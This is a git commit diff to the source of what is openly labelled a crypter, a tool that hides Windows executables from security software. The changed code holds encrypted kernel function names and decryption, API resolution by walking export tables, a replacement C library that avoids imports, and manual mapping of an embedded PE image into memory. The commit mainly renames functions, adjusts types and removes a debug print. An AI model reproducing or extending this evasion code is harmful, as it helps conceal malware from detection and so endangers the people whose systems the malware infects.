0ef349d7fbe511a050b16b0a8dbbfa658d4a8f5c
noone <noone@nothing.com>
2026-07-20 07:37:21 -0400

    Move code from oldversion.c to merged.c

--- src/crypters/idata_obfuscation_dll_api_hashing/merged.c
+++ src/crypters/idata_obfuscation_dll_api_hashing/merged.c
@@ -51,10 +51,14 @@ char encrypted_kernel_library_function_names[] = "\xa0\x96\x48\xdc\xc3\x48\x76\x
 int size_encrypted_kernel_library_function_names = 160;
 const char *kernel_library_function_names = NULL;
 
+// Variables for the C standard library
+
+static HANDLE global_windows_heap = NULL;
+
 // START C STANDARD LIBRARY REPLACEMENT
 
-// strcmp - compare strings
-int replacement_strcmp(const char *s1, const char *s2) {
+// replacement_string - compare strings
+int replacement_string(const char *s1, const char *s2) {
     while (*s1 && (*s1 == *s2)) {
         s1++;
         s2++;
@@ -62,8 +66,8 @@ int replacement_strcmp(const char *s1, const char *s2) {
     return (unsigned char)*s1 - (unsigned char)*s2;
 }
 
-// memcpy - copy memory
-void *replacement_memcpy(void *dest, const void *src, unsigned int n) {
+// replacement_memcpy - copy memory
+void *replacement_memcpy(void *dest, const void *src, size_t n) {
     unsigned char *d = (unsigned char *)dest;
     const unsigned char *s = (const unsigned char *)src;
     while (n--) {
@@ -72,8 +76,8 @@ void *replacement_memcpy(void *dest, const void *src, unsigned int n) {
     return dest;
 }
 
-// memset - set memory
-void *replacement_memset(void *s, int c, unsigned int n) {
+// replacement_memset - set memory
+void *replacement_memset(void *s, int c, size_t n) {
     unsigned char *p = (unsigned char *)s;
     while (n--) {
         *p++ = (unsigned char)c;
@@ -82,7 +86,7 @@ void *replacement_memset(void *s, int c, unsigned int n) {
 }
 
 
-void *replacement_malloc(unsigned int size) {
+void *replacement_malloc(size_t size) {
     return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 }
 
@@ -91,6 +95,7 @@ void replacement_free(void *ptr) {
         ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[10])(ptr, 0, MEM_RELEASE);
     }
 }
+
 
 // #include "executable.h"
 
@@ -169,7 +174,7 @@ void *get_function_address(void *module_address, const char *function_name){
     
     for (DWORD i = 0; i < export_directory->NumberOfNames; i++) {
         const char *function_in_module = (const char *) (((BYTE *) module_address) + names_exported[i]);
-        if (replacement_strcmp(function_in_module, function_name) == 0) {
+        if (replacement_string(function_in_module, function_name) == 0) {
             WORD selected_ordinal = ordinals[i];
             return (((BYTE *) module_address) + function_address_array[selected_ordinal]);
         }
@@ -254,13 +259,6 @@ void decrypt_data(char* src, DWORD size) {
 
 // #include "code_handling.h"
 
-void print_minimal(void) {
-    const char *msg = "Hello from minimal printf\n";
-    HANDLE stdout_handle = ((HANDLE (__stdcall *)(DWORD)) kernel_library_function_addresses[9])(-11);
-    DWORD written;
-    ((BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[8])(stdout_handle, (void*)msg, 26, &written, NULL);
-}
-
 void copy_to_virtual(const char *pe_data, char *image_base){
     IMAGE_DOS_HEADER* source_pe_dos_header = (IMAGE_DOS_HEADER *) pe_data;
     IMAGE_NT_HEADERS* source_pe_nt_header = (IMAGE_NT_HEADERS *) (pe_data + source_pe_dos_header->e_lfanew);
@@ -268,7 +266,7 @@ void copy_to_virtual(const char *pe_data, char *image_base){
 
     // First copy the headers
     replacement_memcpy(image_base, pe_data, source_pe_nt_header->OptionalHeader.SizeOfHeaders);
-    print_minimal();   
+    
     // Now copy each section
     for(int i = 0; i < source_pe_nt_header->FileHeader.NumberOfSections; i++){
         // Copy section to BASE + RVA = virtual address
